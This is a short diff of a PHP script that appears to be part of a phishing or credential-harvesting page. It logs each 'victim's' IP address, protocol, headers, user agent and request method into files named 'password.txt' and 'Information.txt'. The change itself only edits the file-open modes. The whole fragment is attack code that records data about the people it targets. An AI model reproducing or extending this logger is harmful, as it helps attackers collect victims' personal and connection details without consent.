@@ -18,11 +18,11 @@ if(isset($USER_NAME)){
 }
 
 
-$fi = fopen("password.txt" , "w");
+$fi = fopen("password.txt" , "w+a");
 fwrite($fi, "$IP is the remote host's IP\n");
 fwrite($fi, "$proto is the Protocol used on the victim machine.\n");
 fwrite($fi, "$HTTACCEPT Is the Accept Header");
-$fo = fopen("Information.txt" , "w");
+$fo = fopen("Information.txt" , "w+a");
 fwrite($fo, "\n$BROWSER Is the victims USER AGENT");
 fwrite($fo, "\n$SOFTWARE Is the victim's Connection");
 fwrite($fo, "\n$REQ_METH Is the victim's Request Method.");
